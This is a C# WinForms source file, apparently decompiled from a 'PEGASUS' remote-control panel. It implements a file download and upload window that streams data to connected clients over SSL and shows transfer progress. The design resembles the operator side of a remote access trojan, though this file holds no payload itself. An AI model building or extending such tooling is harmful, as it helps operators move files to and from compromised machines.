using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using PEGASUS.Connection;
using PEGASUS.Helper;

namespace PEGASUS.Forms
	{
public class FormDownloadFile : Form
{
	public long FileSize;

	private long BytesSent;

	public string FullFileName;

	public string ClientFullFileName;

	private bool IsUpload;

	public string DirPath;

	private IContainer components;

	public Timer timer1;

	public Label labelsize;

	private Label label3;

	public Label labelfile;

	public Label label1;

	private PictureBox pictureBox1;

	private Guna2BorderlessForm guna2BorderlessForm1;

	private Guna2ShadowForm guna2ShadowForm1;

	public PEGASUSMain F { get; set; }

	internal Clients Client { get; set; }

	public FormDownloadFile()
	{
		InitializeComponent();
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		if (FileSize >= int.MaxValue)
		{
			timer1.Stop();
			MessageBox.Show("Don't support files larger than 2GB.");
			Dispose();
		}
		else if (!IsUpload)
		{
			labelsize.Text = Methods.BytesToString(FileSize) + " \\ " + Methods.BytesToString(Client.BytesRecevied);
			if (Client.BytesRecevied >= FileSize)
			{
				labelsize.Text = "Downloaded";
				labelsize.ForeColor = Color.FromArgb(3, 130, 200);
				timer1.Stop();
			}
		}
		else
		{
			labelsize.Text = Methods.BytesToString(FileSize) + " \\ " + Methods.BytesToString(BytesSent);
			if (BytesSent >= FileSize)
			{
				labelsize.Text = "Uploaded";
				labelsize.ForeColor = Color.FromArgb(3, 130, 200);
				timer1.Stop();
			}
		}
	}

	private void SocketDownload_FormClosed(object sender, FormClosedEventArgs e)
	{
		try
		{
			Client?.Disconnected();
			timer1?.Dispose();
		}
		catch
		{
		}
	}

	public void Send(object obj)
	{
		lock (Client.SendSync)
		{
			try
			{
				IsUpload = true;
				byte[] obj2 = (byte[])obj;
				byte[] bytes = BitConverter.GetBytes(obj2.Length);
				Client.TcpClient.Poll(-1, SelectMode.SelectWrite);
				Client.SslClient.Write(bytes, 0, bytes.Length);
				using (MemoryStream memoryStream = new MemoryStream(obj2))
				{
					int num = 0;
					memoryStream.Position = 0L;
					byte[] array = new byte[50000];
					while ((num = memoryStream.Read(array, 0, array.Length)) > 0)
					{
						Client.TcpClient.Poll(-1, SelectMode.SelectWrite);
						Client.SslClient.Write(array, 0, num);
						BytesSent += num;
					}
				}
				Program.form1.BeginInvoke((MethodInvoker)delegate
				{
					Close();
				});
			}
			catch
			{
				Client?.Disconnected();
				Program.form1.BeginInvoke((MethodInvoker)delegate
				{
					labelsize.Text = "Error";
					labelsize.ForeColor = Color.Red;
				});
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FormDownloadFile));
		label1 = new System.Windows.Forms.Label();
		timer1 = new System.Windows.Forms.Timer(components);
		labelsize = new System.Windows.Forms.Label();
		label3 = new System.Windows.Forms.Label();
		labelfile = new System.Windows.Forms.Label();
		pictureBox1 = new System.Windows.Forms.PictureBox();
		guna2BorderlessForm1 = new Guna.UI2.WinForms.Guna2BorderlessForm(components);
		guna2ShadowForm1 = new Guna.UI2.WinForms.Guna2ShadowForm(components);
		((System.ComponentModel.ISupportInitialize)pictureBox1).BeginInit();
		SuspendLayout();
		label1.AutoSize = true;
		label1.Location = new System.Drawing.Point(92, 74);
		label1.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		label1.Name = "label1";
		label1.Size = new System.Drawing.Size(64, 13);
		label1.TabIndex = 0;
		label1.Text = "Downloaad:";
		timer1.Interval = 1000;
		timer1.Tick += new System.EventHandler(timer1_Tick);
		labelsize.AutoSize = true;
		labelsize.Location = new System.Drawing.Point(153, 74);
		labelsize.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		labelsize.Name = "labelsize";
		labelsize.Size = new System.Drawing.Size(13, 13);
		labelsize.TabIndex = 0;
		labelsize.Text = "..";
		label3.AutoSize = true;
		label3.Location = new System.Drawing.Point(92, 40);
		label3.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		label3.Name = "label3";
		label3.Size = new System.Drawing.Size(26, 13);
		label3.TabIndex = 0;
		label3.Text = "File:";
		labelfile.AutoSize = true;
		labelfile.Location = new System.Drawing.Point(153, 40);
		labelfile.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		labelfile.Name = "labelfile";
		labelfile.Size = new System.Drawing.Size(13, 13);
		labelfile.TabIndex = 0;
		labelfile.Text = "..";
		pictureBox1.Image = (System.Drawing.Image)resources.GetObject("pictureBox1.Image");
		pictureBox1.Location = new System.Drawing.Point(26, 40);
		pictureBox1.Name = "pictureBox1";
		pictureBox1.Size = new System.Drawing.Size(61, 47);
		pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		pictureBox1.TabIndex = 10;
		pictureBox1.TabStop = false;
		guna2BorderlessForm1.ContainerControl = this;
		guna2BorderlessForm1.ShadowColor = System.Drawing.Color.FromArgb(191, 37, 33);
		guna2ShadowForm1.ShadowColor = System.Drawing.Color.FromArgb(191, 37, 33);
		guna2ShadowForm1.TargetForm = this;
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
		base.ClientSize = new System.Drawing.Size(468, 153);
		base.Controls.Add(pictureBox1);
		base.Controls.Add(labelfile);
		base.Controls.Add(labelsize);
		base.Controls.Add(label3);
		base.Controls.Add(label1);
		ForeColor = System.Drawing.Color.LightGray;
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
		base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
		base.Margin = new System.Windows.Forms.Padding(2);
		base.MaximizeBox = false;
		base.MinimizeBox = false;
		base.Name = "FormDownloadFile";
		Text = "Download";
		base.FormClosed += new System.Windows.Forms.FormClosedEventHandler(SocketDownload_FormClosed);
		((System.ComponentModel.ISupportInitialize)pictureBox1).EndInit();
		ResumeLayout(false);
		PerformLayout();
	}
}
}